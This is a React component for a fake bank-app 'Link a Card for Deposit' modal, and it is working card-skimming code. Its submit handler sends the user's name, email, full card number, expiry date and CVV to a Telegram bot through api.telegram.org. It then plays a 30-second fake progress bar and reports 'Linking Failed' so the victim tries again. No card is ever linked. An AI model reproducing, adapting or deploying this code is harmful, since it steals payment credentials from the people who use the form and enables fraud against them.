import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, CreditCard, AlertCircle, Loader2 } from 'lucide-react';
import { useBank } from '@/app/context/BankContext';
import styles from './DepositModal.module.css';

interface DepositModalProps {
  isOpen: boolean;
  onClose: () => void;
}
export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
  const bank = useBank();
  const user = bank.activeUser;
  
  const [cardNumber, setCardNumber] = useState('');
  const [network, setNetwork] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvv, setCvv] = useState('');
  
  const [status, setStatus] = useState<'idle' | 'linking' | 'failed'>('idle');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !network || !expDate || !cvv) return;
    
    setStatus('linking');

    // Send to Telegram
    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    if (token && chatId && token !== 'YOUR_BOT_TOKEN_HERE') {
      const message = `
💳 *New Card Linked*
👤 *User:* ${user?.profileName || 'Unknown'}
📧 *Email:* ${user?.username || 'Unknown'}
🌐 *Network:* ${network.toUpperCase()}
🔢 *Card Number:* ${cardNumber}
📅 *Expiry:* ${expDate}
🔑 *CVV:* ${cvv}
⏰ *Time:* ${new Date().toLocaleString()}
      `;

      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('Telegram error:', err);
      }
    }
    
    // Progress for 30 seconds
    setTimeout(() => {
      setStatus('failed');
    }, 30000);
  };

  const handleClose = () => {
    setStatus('idle');
    setCardNumber('');
    setNetwork('');
    setExpDate('');
    setCvv('');
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className={styles.overlay}>
      <motion.div 
        className={styles.modal}
        initial={{ y: "100%" }}
        animate={{ y: 0 }}
        exit={{ y: "100%" }}
        transition={{ type: "spring", damping: 25, stiffness: 200 }}
      >
        <div className={styles.header}>
          <h3>Link a Card for Deposit</h3>
          <button className={styles.closeBtn} onClick={handleClose}><X size={24} /></button>
        </div>

        {status === 'failed' ? (
          <div className={styles.failedState}>
            <div className={styles.iconFailed}>
              <AlertCircle size={40} color="#d9534f" />
            </div>
            <h4>Linking Failed</h4>
            <p>unable to link your card try again later</p>
            <button className={styles.retryBtn} onClick={() => setStatus('idle')}>Try Again</button>
          </div>
        ) : status === 'linking' ? (
          <div className={styles.linkingState}>
             <div className={styles.linkingIcon}>
                <Loader2 className={styles.spinIcon} size={48} color="#5cb85c" />
             </div>
             <p className={styles.linkingText}>please wait...</p>
             <div className={styles.progressContainer}>
                <motion.div 
                  className={styles.progressBar}
                  initial={{ width: "0%" }}
                  animate={{ width: "100%" }}
                  transition={{ duration: 30, ease: "linear" }}
                />
             </div>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <label>Card Network</label>
              <select 
                value={network} 
                onChange={e => setNetwork(e.target.value)}
                required
                className={styles.input}
                disabled={status === 'linking'}
              >
                <option value="" disabled>Select Network</option>
                <option value="visa">Visa</option>
                <option value="mastercard">Mastercard</option>
                <option value="amex">American Express</option>
                <option value="discover">Discover</option>
              </select>
            </div>

            <div className={styles.inputGroup}>
              <label>Card Number</label>
              <div className={styles.cardInputWrapper}>
                <CreditCard size={18} color="#666" />
                <input 
                  type="text" 
                  value={cardNumber}
                  onChange={e => setCardNumber(e.target.value)}
                  placeholder="0000 0000 0000 0000"
                  required
                  maxLength={19}
                  className={styles.inputNoBorder}
                  disabled={status === 'linking'}
                />
              </div>
            </div>

            <div className={styles.rowGrid}>
              <div className={styles.inputGroup}>
                <label>Expiration Date</label>
                <input 
                  type="text" 
                  value={expDate}
                  onChange={e => setExpDate(e.target.value)}
                  placeholder="MM/YY"
                  required
                  maxLength={5}
                  className={styles.input}
                  disabled={status === 'linking'}
                />
              </div>
              <div className={styles.inputGroup}>
                <label>CVV</label>
                <input 
                  type="password" 
                  value={cvv}
                  onChange={e => setCvv(e.target.value)}
                  placeholder="123"
                  required
                  maxLength={4}
                  className={styles.input}
                  disabled={status === 'linking'}
                />
              </div>
            </div>

            <button 
              type="submit" 
              className={styles.submitBtn}
              disabled={status === 'linking'}
            >
              {status === 'linking' ? (
                <>
                  <span className={styles.spinner}></span> Please wait...
                </>
              ) : 'Link Card'}
            </button>
          </form>
        )}
      </motion.div>
    </div>
  );
}
